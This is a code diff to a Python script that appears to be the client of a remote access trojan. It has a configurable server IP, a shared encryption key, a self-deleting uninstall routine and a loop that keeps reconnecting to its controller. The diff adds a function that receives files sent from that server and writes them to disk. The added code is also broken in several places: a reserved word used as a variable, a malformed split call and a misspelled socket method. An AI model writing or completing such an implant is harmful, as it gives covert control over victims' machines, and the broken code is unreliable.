@@ -27,9 +27,9 @@ from Crypto.Hash import SHA256
 
 
 #Variables
-lHost = ""                    #Server IP
-port = 80                     #Connection Port
-key = ""                      #Encryption key (16 characters) use the same on server script
+Host = ""                    #Server IP
+port = 80                    #Connection Port
+key = ""                     #Encryption key (16 characters) use the same on server script
 
 
 
@@ -126,7 +126,35 @@ def uninstall():
     os.remove(sys.executable)
     
 def download():
-    
+    data_bytes = []
+    continue = True
+    i = 1
+    received = ""
+    received = soc.recv(4096)
+    received = decrypt(key, received)
+    name_file = received[-1].split(\) #only for a file from windows|for file from linux used .split(/)
+    size = received[1]
+    while continue:
+        received = soc.recb(4096)
+        i += 1
+        if received == b"Upload finished":
+            i = 0
+            while i < len(data_bytes):
+                if i == 0:
+                    file = open(name_file, "wb")
+                    file.write(data_bytes[i])
+                    file.close()
+                else:
+                    file = open(name_file, "ab")
+                    file.write(data_bytes[i])
+                    file.close()
+                i += 1
+                if i == len(data_bytes):
+                    continue = False
+        else:
+            data_bytes.append(received)
+        if not received:
+            continue = False
     
 
 def upload(path_file):
@@ -170,7 +198,7 @@ def main():
     connected = False
     while connected == False:
         try:
-            soc.connect((host, port))
+            soc.connect((Host, port))
             connected = True
         except:
             sleepTime = random.randint(20, 30)
